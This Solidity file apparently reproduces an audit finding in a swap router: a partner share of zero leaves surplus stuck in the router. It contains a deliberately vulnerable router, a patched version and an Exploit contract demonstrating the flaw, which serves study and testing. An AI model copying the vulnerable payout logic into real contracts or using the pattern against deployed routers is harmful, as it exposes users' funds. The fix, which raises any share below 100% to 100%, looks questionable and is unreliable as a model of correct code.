// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  GlueX V2 — GluexRouter pays a partner 0 while surplus sits in the router
    (Shieldify, finding #61338 / H-02, June 2025).

    SYNTHETIC, cheatcode-free. The partner share is the quoted product
    (surplus * partnerSurplusShare) / 10000 with no floor. A desc that sets
    the share to 0 pays the partner 0 and leaves N = 1000 GLX in the router.
    The fixed router lifts a zero share to 10000 bps and pays the partner N. */

contract Token {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory name_, string memory symbol_, uint8 decimals_) {
        name = name_;
        symbol = symbol_;
        decimals = decimals_;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "bal");
        require(allowance[from][msg.sender] >= amount, "allow");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

struct RouteDescription {
    address partner;
    uint256 partnerSurplusShare;
    uint256 partnerSlippageShare;
}

contract GluexRouter {
    Token public token;
    uint256 public lastPartnerShare;

    constructor(Token token_) {
        token = token_;
    }

    function swap(RouteDescription calldata desc, uint256 quoted, uint256 delivered)
        external
        returns (uint256 finalOutputAmount, uint256 surplus, uint256 slippage)
    {
        token.transferFrom(msg.sender, address(this), delivered);
        require(delivered >= quoted, "delivered");
        finalOutputAmount = quoted;
        surplus = delivered - quoted;
        slippage = 0;
        if (quoted > 0) token.transfer(msg.sender, quoted);
        if (surplus > 0 || slippage > 0) {
            // @> VULN: partnerSurplusShare may be 0, so this product is 0 and the partner is skipped
            uint256 partnerSurplus = (surplus * desc.partnerSurplusShare) / 10000;
            uint256 partnerSlippage = (slippage * desc.partnerSlippageShare) / 10000;
            uint256 partnerShare = partnerSurplus + partnerSlippage;
            lastPartnerShare = partnerShare;
            if (partnerShare > 0) token.transfer(desc.partner, partnerShare);
        }
    }
}

contract GluexRouterFixed {
    Token public token;
    uint256 public constant MIN_SHARE = 10000;
    uint256 public lastPartnerShare;

    constructor(Token token_) {
        token = token_;
    }

    function swap(RouteDescription calldata desc, uint256 quoted, uint256 delivered)
        external
        returns (uint256 finalOutputAmount, uint256 surplus, uint256 slippage)
    {
        token.transferFrom(msg.sender, address(this), delivered);
        require(delivered >= quoted, "delivered");
        finalOutputAmount = quoted;
        surplus = delivered - quoted;
        slippage = 0;
        if (quoted > 0) token.transfer(msg.sender, quoted);
        if (surplus > 0 || slippage > 0) {
            uint256 surplusBps = desc.partnerSurplusShare < MIN_SHARE ? MIN_SHARE : desc.partnerSurplusShare;
            uint256 slippageBps = desc.partnerSlippageShare < MIN_SHARE ? MIN_SHARE : desc.partnerSlippageShare;
            uint256 partnerSurplus = (surplus * surplusBps) / 10000;
            uint256 partnerSlippage = (slippage * slippageBps) / 10000;
            uint256 partnerShare = partnerSurplus + partnerSlippage;
            lastPartnerShare = partnerShare;
            if (partnerShare > 0) token.transfer(desc.partner, partnerShare);
        }
    }
}

contract Exploit {
    uint256 public constant N = 1000 ether;

    Token public token;
    GluexRouter public router;
    address public partner;

    constructor() {
        token = new Token("GlueX", "GLX", 18);
        router = new GluexRouter(token);
        partner = address(new Partner());
    }

    function run() external {
        token.mint(address(this), N);
        token.approve(address(router), N);
        router.swap(RouteDescription({partner: partner, partnerSurplusShare: 0, partnerSlippageShare: 0}), 0, N);
        require(router.lastPartnerShare() == 0, "share was not zero");
        require(token.balanceOf(partner) == 0, "partner was paid");
        require(token.balanceOf(address(router)) == N, "surplus did not stay");
    }
}

contract Partner {}
